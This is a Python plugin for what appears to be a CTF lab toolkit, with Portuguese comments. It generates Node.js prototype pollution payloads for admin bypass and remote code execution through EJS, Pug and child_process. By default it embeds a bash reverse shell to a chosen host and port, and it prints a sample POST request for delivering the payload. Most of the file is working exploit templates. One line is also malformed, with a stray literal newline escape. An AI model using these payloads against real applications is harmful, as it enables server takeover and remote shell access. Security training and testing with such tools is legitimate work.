"""
plugins/prototype_pollution.py — plugin: JS/Node.js Prototype Pollution Wizard.
"""

from __future__ import annotations

import json
from rich.console import Console
from ctflab.core.session import Session
from ctflab.cli.ui import ask

PLUGIN_NAME = "JS/Node Prototype Pollution"
PLUGIN_DESC = "Gera payloads de poluição de protótipo em JavaScript para bypass de auth e RCE"

_PAYLOAD_TEMPLATES = {
    "1": (
        "Privilege Escalation (JSON bypass)",
        '{"__proto__": {"isAdmin": true}}'
    ),
    "2": (
        "EJS RCE (Injeção de Código via Engine)",
        '{"__proto__": {"client": true, "escapeFunction": "console.log(process.mainModule.require(\'child_process\').execSync(\'{cmd}\').toString())"}}'
    ),
    "3": (
        "Pug RCE (Injeção de Opções de Spawn)",
        '{"__proto__": {"self": true, "line": "process.mainModule.require(\'child_process\').execSync(\'{cmd}\')"}}'
    ),
    "4": (
        "Node child_process spawn RCE (Bypass de Variáveis de Ambiente)",
        '{"__proto__": {"shell": "/bin/sh", "env": {"NODE_OPTIONS": "--require=/proc/self/environ"}, "argv0": "console.log(process.mainModule.require(\'child_process\').execSync(\'{cmd}\'))"}}'
    )
}

def run(session: Session, console: Console) -> None:
    console.rule("[head]JS/NODE PROTOTYPE POLLUTION WIZARD[/head]")
    console.print("[dim]Gera payloads de poluição de protótipo em Javascript (Node.js) para bypass de lógica ou RCE.[/dim]\n")

    # Recupera o payload de reverse shell da sessão ou usa comando customizado
    default_cmd = session.recall("reverse_shell_payload", "")
    if not default_cmd:
        lhost = session.recall("lhost", "127.0.0.1")
        lport = session.recall("lport", "4444")
        default_cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"

    cmd = ask("Comando a ser executado no exploit", default_cmd)

    console.print("\n[info]Selecione a Técnica / Payload de Poluição:[/info]")
    for k, (name, _) in _PAYLOAD_TEMPLATES.items():
        console.print(f"  [{k}] {name}")

    opt = ask("Opção", "1")
    if opt not in _PAYLOAD_TEMPLATES:
        console.print("[fail]Opção inválida[/fail]")
        return

    name, template = _PAYLOAD_TEMPLATES[opt]
    
    # Formata o comando no payload
    safe_cmd = cmd.replace('\\', '\\\\').replace('"', '\\"').replace("'", "\\'")\n    payload_str = template.replace("{cmd}", safe_cmd)

    console.print("\n" + "="*60)
    console.print(f"[ok]PAYLOAD DE POLUIÇÃO GERADO ({name})[/ok]")
    console.print("="*60)
    console.print(payload_str, style="bold yellow")
    console.print("="*60 + "\n")
    console.print("[info]Exemplo de vetor de entrega (Body POST JSON):[/info]")
    console.print(f"  POST /update HTTP/1.1\n  Content-Type: application/json\n\n  {payload_str}", style="dim white")
